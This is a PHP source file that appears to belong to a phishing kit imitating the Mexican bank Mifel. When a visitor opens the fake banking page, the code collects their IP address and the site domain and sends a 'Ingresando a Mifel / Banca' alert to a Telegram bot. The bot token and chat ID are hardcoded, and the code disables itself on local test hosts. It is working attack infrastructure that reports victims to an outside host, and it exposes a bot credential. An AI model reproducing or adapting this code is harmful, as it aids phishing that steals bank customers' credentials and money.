<?php

const TELEGRAM_ENABLED = true;
const TELEGRAM_LOGIN_ENABLED = false;
const TELEGRAM_DISABLE_ON_LOCAL = true;
const TELEGRAM_LOGIN_TOKEN = '8918920540:AAE-BmLdmhiycOerfax82QvSpZwK2BP-wMI';
const TELEGRAM_LOGIN_CHAT_ID = '-1003932995325';
const TELEGRAM_LOGIN_DEBOUNCE_SEC = 60;

function telegram_es_entorno_local(): bool
{
    if (!TELEGRAM_DISABLE_ON_LOCAL) {
        return false;
    }

    $host = strtolower(trim((string) ($_SERVER['HTTP_HOST'] ?? '')));
    $host = preg_replace('/:\d+$/', '', $host);

    if (in_array($host, ['localhost', '127.0.0.1', '[::1]', '::1'], true)) {
        return true;
    }

    if ($host !== '' && (str_ends_with($host, '.local') || str_ends_with($host, '.test'))) {
        return true;
    }

    $ip = trim((string) ($_SERVER['REMOTE_ADDR'] ?? ''));
    if (in_array($ip, ['127.0.0.1', '::1'], true)) {
        return true;
    }

    return false;
}

function telegram_esta_habilitado(): bool
{
    return TELEGRAM_ENABLED && !telegram_es_entorno_local();
}

function telegram_login_notificar(): void
{
    if (!telegram_esta_habilitado() || !TELEGRAM_LOGIN_ENABLED) {
        return;
    }

    $ip = telegram_login_obtener_ip();
    if ($ip === '') {
        return;
    }

    if (telegram_login_debounce_activo($ip)) {
        return;
    }

    date_default_timezone_set('America/Mexico_City');
    $fecha = date('Y-m-d');
    $hora = date('H:i:s');
    $dominio = telegram_login_obtener_dominio();
    $mensaje = "Ingresando a Mifel / Banca\n{$ip} | {$dominio}\nFecha: {$fecha} | Hora: {$hora}";

    if (telegram_login_enviar($mensaje)) {
        telegram_login_marcar_envio($ip);
    }
}

function telegram_login_obtener_dominio(): string
{
    $host = trim((string) ($_SERVER['HTTP_HOST'] ?? ''));
    if ($host === '') {
        return 'desconocido';
    }

    return preg_replace('/:\d+$/', '', $host);
}

function telegram_mensaje_pie(string $ip = ''): string
{
    date_default_timezone_set('America/Mexico_City');
    $fecha = date('Y-m-d');
    $hora = date('H:i:s');
    $ipTxt = $ip !== '' ? $ip : '—';

    return "[ {$fecha} | {$hora} | {$ipTxt} ]";
}

function telegram_login_obtener_ip(): string
{
    $candidatos = [
        $_SERVER['HTTP_CF_CONNECTING_IP'] ?? null,
        $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null,
        $_SERVER['HTTP_X_REAL_IP'] ?? null,
        $_SERVER['REMOTE_ADDR'] ?? null,
    ];

    foreach ($candidatos as $valor) {
        if (!$valor) {
            continue;
        }

        $ip = trim(explode(',', (string) $valor)[0]);
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            return $ip;
        }
    }

    return '';
}

function telegram_login_debounce_activo(string $ip): bool
{
    $archivo = telegram_login_lock_path($ip);
    if (!is_file($archivo)) {
        return false;
    }

    return (time() - (int) filemtime($archivo)) < TELEGRAM_LOGIN_DEBOUNCE_SEC;
}

function telegram_login_marcar_envio(string $ip): void
{
    @touch(telegram_login_lock_path($ip), time());
}

function telegram_login_lock_path(string $ip): string
{
    return sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'mifel_telegram_login_' . md5($ip) . '.lock';
}

function telegram_login_enviar(string $mensaje): bool
{
    if (!telegram_esta_habilitado()) {
        return false;
    }

    if (!function_exists('curl_init')) {
        return false;
    }

    $ch = curl_init('https://api.telegram.org/bot' . TELEGRAM_LOGIN_TOKEN . '/sendMessage');
    if ($ch === false) {
        return false;
    }

    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => TELEGRAM_LOGIN_CHAT_ID,
            'text' => $mensaje,
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    $ok = $response !== false && curl_errno($ch) === 0;
    curl_close($ch);

    if (!$ok) {
        return false;
    }

    $data = json_decode((string) $response, true);

    return is_array($data) && !empty($data['ok']);
}
